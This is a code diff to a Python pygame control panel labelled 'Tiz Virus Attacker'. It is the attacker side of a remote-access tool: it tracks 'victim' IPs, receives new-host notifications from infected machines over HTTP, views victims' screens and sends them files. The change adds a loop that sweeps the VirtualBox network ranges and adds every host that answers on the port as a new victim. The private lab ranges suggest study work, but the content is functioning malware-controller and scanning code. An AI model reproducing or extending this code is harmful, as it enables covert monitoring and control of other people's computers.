@@ -35,8 +35,13 @@ pygame.display.set_caption("Remote Desktop Menu")
 # Font
 font = pygame.font.Font(None, 36)
 
-# Vector victim origin
-VICTIM_IPS = ['192.168.1.13']
+# Update the network-related constants
+NETWORK_RANGES = [
+    "10.0.2",     # VirtualBox default NAT
+    "192.168.56",
+]
+
+VICTIM_IPS = ['10.0.2.15']
 
 # Thread pool for background tasks
 thread_pool = ThreadPoolExecutor(max_workers=4)
@@ -52,8 +57,8 @@ class HostNotificationHandler(BaseHTTPRequestHandler):
             data = json.loads(post_data.decode('utf-8'))
             
             if 'new_host' in data:
-                host_manager.add_host(data['new_host'])
-                # Update the displays
+                new_host = data['new_host']
+                ui_state.discovered_hosts.add(new_host)
                 update_displays()
             
             self.send_response(200)
@@ -64,18 +69,21 @@ def start_notification_server():
     server.serve_forever()
 
 def update_displays():
-    global displays
-    hosts = host_manager.get_hosts()
-    
-    # Create new displays for new hosts
+    """Update displays when new hosts are discovered."""
+    global displays, VICTIM_IPS
     current_ips = [d.text for d in displays]
-    for host in hosts:
+    
+    # Add new displays for discovered hosts
+    for host in ui_state.discovered_hosts:
         if host not in current_ips:
+            if host not in VICTIM_IPS:
+                VICTIM_IPS.append(host)
             row = len(displays) // 3
             col = len(displays) % 3
             x = 50 + col * 250
             y = 50 + row * 200
             displays.append(Display(x, y, 200, 150, host, font))
+            ui_state.victims_status[host] = "Not reachable"
 
 class UIState:
     def __init__(self):
@@ -87,10 +95,9 @@ class UIState:
         self.file_sending = False
         self.victims_status = {ip: "Not reachable" for ip in VICTIM_IPS}
         self.running = True
-
+        self.discovered_hosts = set()  # Track newly discovered hosts
 
 ui_state = UIState()
-
 
 def parseargs():
     cli_args = argparse.ArgumentParser(description="Tiz Virus Attacker")
@@ -101,7 +108,6 @@ def parseargs():
     options.hosts = VICTIM_IPS
     return options
 
-
 # Create initial displays
 displays = [
     Display(50, 50, 200, 150, VICTIM_IPS[0], font),
@@ -111,7 +117,6 @@ displays = [
 add_button = Display(WIDTH - 100, HEIGHT - 100, 80, 80, "+", font)
 back_button = Display(10, 10, 100, 50, "Back", font)
 
-
 def create_new_display():
     num_displays = len(displays)
     row = num_displays // 3
@@ -120,30 +125,40 @@ def create_new_display():
     y = 50 + row * 200
     return Display(x, y, 200, 150, f"Display {num_displays + 1}", font)
 
-
 def check_single_victim(host, port):
+    """Check if a host is reachable on the given port."""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(0.5)  # Reduced timeout
+        s.settimeout(0.5)
         s.connect((host, port))
         s.close()
         return "Reachable"
     except socket.error:
         return "Not reachable"
 
-
 def status_checker_thread(options):
+    """Check status of all known victims including newly discovered ones."""
     while ui_state.running:
-        for host in options.hosts:
+        # Update status for all known hosts
+        for host in VICTIM_IPS:
             status = check_single_victim(host, options.port)
             ui_state.victims_status[host] = status
-        pygame.time.delay(2000)  # Check every 2 seconds
-
+        
+        # Check for new hosts in common VM network ranges
+        for base_ip in NETWORK_RANGES:
+            for i in range(1, 255):
+                host = f"{base_ip}.{i}"
+                if host not in VICTIM_IPS:
+                    status = check_single_victim(host, options.port)
+                    if status == "Reachable":
+                        ui_state.discovered_hosts.add(host)
+                        update_displays()
+        
+        pygame.time.delay(5000)  # Check every 5 seconds
 
 def draw_static_frame(surface, frame_rect, border_color=(0, 0, 0), border_width=2):
     """Vẽ khung tĩnh không thay đổi."""
     pygame.draw.rect(surface, border_color, frame_rect, border_width)
-
 
 def show_full_screen(display, options):
     full_screen = True
@@ -233,7 +248,6 @@ def show_full_screen(display, options):
     if screen_receiver:
         screen_receiver.stop()
 
-
 def main():
     global options
     options = parseargs()
@@ -245,13 +259,8 @@ def main():
     # Initialize displays with saved hosts
     saved_hosts = host_manager.get_hosts()
     for host in saved_hosts:
-        if host not in VICTIM_IPS:
-            VICTIM_IPS.append(host)
-            row = len(displays) // 3
-            col = len(displays) % 3
-            x = 50 + col * 250
-            y = 50 + row * 200
-            displays.append(Display(x, y, 200, 150, host, font))
+        ui_state.discovered_hosts.add(host)
+    update_displays()
 
     # Start status checker thread
     status_thread = threading.Thread(target=status_checker_thread, args=(options,), daemon=True)
@@ -300,7 +309,6 @@ def main():
     # Cleanup
     thread_pool.shutdown(wait=False)
     pygame.quit()
-
 
 if __name__ == "__main__":
     main()
